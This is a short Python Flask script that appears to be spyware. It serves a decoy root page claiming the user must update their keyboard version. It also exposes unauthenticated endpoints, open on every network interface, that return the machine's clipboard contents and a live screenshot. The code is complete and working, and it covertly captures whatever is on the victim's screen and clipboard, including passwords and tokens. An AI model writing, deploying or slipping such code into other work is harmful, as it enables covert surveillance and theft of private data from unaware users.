from flask import Flask, jsonify, send_file
import pyperclip
from PIL import ImageGrab
from io import BytesIO
app = Flask(__name__)

@app.route("/")
def main():
    return jsonify("You need to update your keyboard version")

@app.route("/getClipboard")
def getClipboard():
    return jsonify(pyperclip.paste())

@app.route("/getScreenshot")
def getScreenshot():
    screenshot = ImageGrab.grab()
    img_io = BytesIO()
    screenshot.save(img_io, 'PNG')
    img_io.seek(0)

    # Return the image as a Flask response with the appropriate MIME type
    return send_file(img_io, mimetype='image/png')


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)
